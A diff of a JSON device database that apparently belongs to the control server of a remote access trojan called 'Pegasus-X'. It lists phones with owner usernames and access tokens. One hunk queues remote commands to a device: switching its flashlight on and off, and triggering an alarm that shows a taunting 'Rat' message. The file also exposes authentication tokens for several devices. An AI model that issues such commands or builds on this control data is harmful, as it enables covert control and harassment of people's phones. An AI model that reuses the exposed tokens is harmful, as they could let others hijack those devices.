@@ -9361,7 +9361,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777257792373,
+    "lastSeen": 1777257822366,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -12793,7 +12793,30 @@
     "ownerUsername": "gehgtg17",
     "token": "90cf9530809f1bedea854cc0afc2ba55",
     "lastSeen": 1777257792150,
-    "commandQueue": [],
+    "commandQueue": [
+      {
+        "type": "flashlight",
+        "payload": {
+          "state": "on"
+        },
+        "sentAt": 1777257802122
+      },
+      {
+        "type": "flashlight",
+        "payload": {
+          "state": "off"
+        },
+        "sentAt": 1777257811511
+      },
+      {
+        "type": "trigger_alarm",
+        "payload": {
+          "message": "Pegasus-X Rat Ni Dek😹",
+          "duration": 10000
+        },
+        "sentAt": 1777257814679
+      }
+    ],
     "online": true,
     "connectedAt": "2026-04-27T02:42:21.379Z",
     "deviceInfo": {
@@ -12824,7 +12847,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "d4f6e60787c25e6874b7744519619ebb",
-    "lastSeen": 1777257791725,
+    "lastSeen": 1777257821749,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T02:42:24.052Z",
